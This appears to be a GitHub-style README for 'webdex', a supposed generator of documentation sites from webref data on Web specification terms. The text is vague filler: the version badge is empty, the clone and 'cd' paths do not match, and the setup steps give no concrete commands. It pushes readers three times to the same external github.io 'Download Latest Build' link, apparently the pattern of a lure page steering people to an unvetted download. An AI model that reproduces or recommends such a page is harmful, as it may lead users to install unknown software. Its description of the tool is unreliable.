# webdex - web documentation generator 2026

> **webdex creates a web-based documentation site from webref data, collecting terms from Web specifications, connecting them to their definitions, and showing where each term is cited.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leolabs36/webdex-webref-docs?style=flat-square)](https://github.com/leolabs36/webdex-webref-docs)

---

<p align="center">
  <a href="https://leolabs36.github.io/webdex-webref-docs/">
    <img src="https://img.shields.io/badge/Download-webdex%20Latest-brightgreen?style=for-the-badge" alt="Download webdex">
  </a>
</p>

> **[Direct Download - webdex](https://leolabs36.github.io/webdex-webref-docs/)**

---

[Download Latest Build](https://leolabs36.github.io/webdex-webref-docs/)

---

## What webdex does

webdex transforms structured webref content into a navigable documentation site for terms defined throughout Web specifications. The goal is to make it easy to jump from a term to its definition and to see which specifications mention that term.

That makes the project helpful for people working with standards, comparing terminology across specs, or needing a clearer path through linked references in the web platform ecosystem. Rather than presenting a flat index, the generated site is built around discovery, context, and cross-spec navigation.

---

## Key capabilities

- Produces a documentation site from webref data
- Gathers terms defined across Web specifications
- Connects each term to its source definition
- Shows which specifications reference a given term
- Structures terminology for simpler browsing and lookup
- Provides a foundation for web-based site generation
- Supports standards-focused documentation workflows

---

## Installation

Clone the repository and open it in your preferred development setup:

    git clone https://github.com/leolabs36/webdex-webref-docs.git
    cd webdex

If the site is created through a build process, run the repository's build command before previewing or publishing the output. For web deployment, configure your hosting to serve the generated site directory.

---

## Usage

A standard workflow looks like this:

1. Update or prepare the webref data source.
2. Run the generator to build the documentation site.
3. Inspect the generated pages for term links and specification references.
4. Publish the output to your web hosting target.

If the repository includes local preview tooling, use it to review the generated content before deployment. The exact commands depend on how the project is arranged.

---

## Configuration

Project settings are usually kept in the files that define the generation process and the webref input source. Typical options include the data path, output directory, and site metadata.

Example structure:

    {
      "input": "path/to/webref-data",
      "output": "path/to/site",
      "siteName": "webdex"
    }

Update these values so they match your source data and publication destination.

---

## Requirements

- Web platform environment for building and serving the generated site
- webref data available as the input source
- A modern browser for viewing the published output
- File system access for cloning, generating, and publishing the site

---

## FAQ

**What does webdex produce?**  
It generates a site focused on terms from Web specifications, with links to definitions and references back to the specs that use them.

**Where is the content sourced from?**  
The project uses webref data as its input.

**How do I refresh the site?**  
Update the input data, rerun the generator, and publish the new output.

**What should I check if the build fails?**  
Review the input data path, configuration values, and any generation scripts included in the repository.

**Is customization supported?**  
Yes. The available configuration and build process allow changes depending on how the project is organized.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
